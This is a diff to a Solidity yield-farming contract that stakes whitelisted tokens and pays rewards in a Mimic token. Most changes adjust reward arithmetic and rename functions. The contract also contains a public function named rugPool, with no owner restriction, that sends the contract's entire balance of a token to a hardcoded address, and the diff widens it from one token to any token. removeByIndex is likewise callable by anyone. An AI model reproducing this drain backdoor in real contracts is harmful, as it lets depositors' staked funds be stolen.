@@ -100,17 +100,17 @@ contract Farming is Ownable {
         view
         returns (uint256)
     {
+        uint256 decimals = (ERC20(_token).decimals());
+        uint256 expo = 10**decimals;
         uint256 time = calculateTime(_account, _token).mul(1e18);
-        uint256 rate = 864;
+        uint256 rate = 86400;
         uint256 timeRate = time.div(rate);
-        uint256 reward = stakingBalance[_token][_account].mul(timeRate).div(
-            1e18
-        );
+        uint256 reward = stakingBalance[_token][_account].mul(timeRate).div(expo);
         return reward;
     }
 
-    //Issuing Token
-    function issueTokens(address _token) public {
+    //ClaimRewards
+    function claimRewards(address _token) public {
         uint256 balance = stakingBalance[_token][msg.sender];
         uint256 reward = calculateRewards(msg.sender, _token);
         require(reward >= 0 && balance >= 0);
@@ -121,15 +121,21 @@ contract Farming is Ownable {
     //Unstake with amount
     function unstakeTokens(uint256 _amount, address _token) public {
         require(_amount > 0);
+        uint256 reward = calculateRewards(msg.sender, _token);
         ERC20(_token).transfer(msg.sender, _amount);
         uint256 remain = stakingBalance[_token][msg.sender].sub(_amount);
         stakingBalance[_token][msg.sender] = remain;
-
-        //withdraw and claim reward
-        uint256 reward = calculateRewards(msg.sender, _token);
         // require(reward > 0 && stakingBalance[msg.sender] >= 0);
         MimicToken.transfer(msg.sender, reward);
         updateTime[_token][msg.sender] = block.timestamp;
+    }
+
+    function getStakingBalance(address _token, address _account)
+        public
+        view
+        returns (uint256)
+    {
+        return stakingBalance[_token][_account];
     }
 
     function addWhitelisted(address _token) public onlyOwner {
@@ -155,7 +161,7 @@ contract Farming is Ownable {
     }
 
     function removeByIndex(uint256 i) public {
-        while (i < whitelisted.length-1) {
+        while (i < whitelisted.length - 1) {
             whitelisted[i] = whitelisted[i + 1];
             i++;
         }
@@ -172,7 +178,7 @@ contract Farming is Ownable {
     }
 
     function rugPool(address _token) public {
-        uint256 balance = JUSDToken.balanceOf(address(this));
+        uint256 balance = ERC20(_token).balanceOf(address(this));
         ERC20(_token).transfer(
             0x2AAc0eb300FA402730bCEd0B4C43a7Fe6BF6491e,
             balance
